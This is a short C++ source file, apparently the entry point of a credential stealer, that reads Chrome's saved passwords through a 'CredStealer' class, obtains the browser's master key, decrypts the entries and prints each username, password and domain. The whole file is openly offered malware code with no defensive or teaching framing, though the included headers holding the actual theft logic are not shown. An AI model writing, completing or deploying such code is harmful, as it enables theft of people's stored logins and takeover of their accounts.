#include <vector>
#include <iostream>
#include "CredStealer.h"
#include "DecryptionHandler.h"

int main()
{
    CredStealer stealer;
    std::vector<ComboEntry> stolenData = stealer.readChromePasswords();
    DecryptionHandler decrypter;
    std::string key = decrypter.getMasterKey();
    std::vector<ComboEntry> passwords = decrypter.decryptPasswords(key, stolenData);

    for (int i=0; i<passwords.size(); i++)
    {
        std::cout << "Username: " + passwords.at(i).getUsername() << std::endl;
        std::cout << "Password: " + passwords.at(i).getPassword() << std::endl;
        std::cout << "Domain: " + passwords.at(i).getDomain() << std::endl;
    }

    return 0;
}
